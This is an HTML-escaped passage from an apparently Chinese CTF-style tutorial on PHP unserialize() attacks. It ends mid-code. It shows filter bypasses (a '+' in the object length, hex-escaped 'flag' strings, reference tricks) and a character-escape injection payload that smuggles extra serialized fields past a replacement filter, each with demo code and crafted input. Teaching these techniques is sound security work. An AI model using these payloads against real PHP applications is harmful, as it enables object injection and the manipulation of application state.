language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a = &lt;span class=&#34;string&#34;&gt;&amp;#x27;abc&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;  &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a.PHP_EOL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;match&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/^O:\d+/&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;you lose!&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;O:4:&amp;quot;test&amp;quot;:1:&amp;#123;s:1:&amp;quot;a&amp;quot;;s:3:&amp;quot;abc&amp;quot;;&amp;#125;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// +号绕过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;O:4&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;O:+4&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// serialize(array($a));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;a:1:&amp;#123;i:0;O:4:&amp;quot;test&amp;quot;:1:&amp;#123;s:1:&amp;quot;a&amp;quot;;s:3:&amp;quot;abc&amp;quot;;&amp;#125;&amp;#125;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;十六进制绕过字符匹配&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#十六进制绕过字符匹配&#34;&gt;#&lt;/a&gt; 十六进制绕过字符匹配&lt;/h4&gt;
&lt;p&gt;可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Read&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name == &lt;span class=&#34;string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You did it!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;strpos&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;) === &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$obj&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You can&amp;#x27;t do it!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这里检测了是否包含  &lt;code&gt;flag&lt;/code&gt;  字符，我们可以尝试使用  &lt;code&gt;flag&lt;/code&gt;  的十六进制  &lt;code&gt;\66\6c\61\67&lt;/code&gt;  来绕过，构造以下:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&#39;O:4:&amp;quot;Read&amp;quot;:1:&amp;#123;s:4:&amp;quot;name&amp;quot;;S:4:&amp;quot;\66\6c\61\67&amp;quot;;&amp;#125;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以用下面 python 脚本将字符串转化为 Hex&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt; = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter a string: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;.encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;利用引用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用引用&#34;&gt;#&lt;/a&gt; 利用‘引用’&lt;/h4&gt;
&lt;p&gt;对于需要判断两个变量是否相等时，我们可以考虑使用引用来让两个变量始终相等.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a = &lt;span class=&#34;string&#34;&gt;&amp;#x27;abc&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;b= &amp;amp;&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;  &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a===&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;b)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;666&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;test&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;上面这个例子将 &lt;code&gt;$b&lt;/code&gt;  设置为 &lt;code&gt;$a&lt;/code&gt;  的引用，可以使 &lt;code&gt;$a&lt;/code&gt;  永远与 &lt;code&gt;$b&lt;/code&gt;  相等&lt;/p&gt;
&lt;h4 id=&#34;php反序列化字符逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化字符逃逸&#34;&gt;#&lt;/a&gt; php 反序列化字符逃逸&lt;/h4&gt;
&lt;h5 id=&#34;情况一过滤后字符过多&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#情况一过滤后字符过多&#34;&gt;#&lt;/a&gt; 情况一：过滤后字符过多&lt;/h5&gt;
&lt;p&gt;例如以下情形：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;change&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;xx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$age&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;I am 11&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$age&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;反序列化字符串：&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;过滤后:&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$old&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;change&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$new&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$old&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$new&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br/&amp;gt;此时，age=&lt;span class=&#34;subst&#34;&gt;$new&lt;/span&gt;[1]&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;正常情况，传入 &lt;code&gt;name=mao&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/394sFvRJkYWAglS.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果此时多传入一个 x 的话会怎样，毫无疑问反序列化失败，由于溢出 (s 本来是 4 结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/im4EPGFUnTDd52o.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;那我们传入 &lt;code&gt;name=maoxxxxxxxxxxxxxxxxxxxx&amp;quot;;i:1;s:6:&amp;quot;woaini&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/Amz5WT7IJGrwKL3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;传入 &lt;code&gt;name=maoxxxxxxxxxxxxxxxxxxxx&amp;quot;;i:1;s:6:&amp;quot;woaini&amp;quot;;&amp;#125;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;&amp;quot;;i:1;s:6:&amp;quot;woaini&amp;quot;;&amp;#125;&lt;/code&gt;  这一部分一共二十个字符&lt;br&gt;
由于一个 x 会被替换为两个，我们输入了一共 20 个 x，现在是 40 个，多出来的 20 个 x 其实取代了我们的这二十个字符 &lt;code&gt;&amp;quot;;i:1;s:6:&amp;quot;woaini&amp;quot;;&amp;#125;&lt;/code&gt; ，从而造成 &lt;code&gt;&amp;quot;;i:1;s:6:&amp;quot;woaini&amp;quot;;&amp;#125;&lt;/code&gt;  的溢出，而 &amp;quot; 闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出 &lt;code&gt;woaini&lt;/code&gt; &lt;br&gt;
 最后的；} 闭合反序列化全过程导致原来的 &lt;code&gt;&amp;quot;;i:1;s:7:&amp;quot;I am 11&amp;quot;;&amp;#125;&amp;quot;&lt;/code&gt;  被舍弃，不影响反序列化过程&lt;/p&gt;
&lt;h5 id=&#34;情况二过滤后字符变少&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#情况二过滤后字符变少&#34;&gt;#&lt;/a&gt; 情况二：过滤后字符变少&lt;/h5&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span 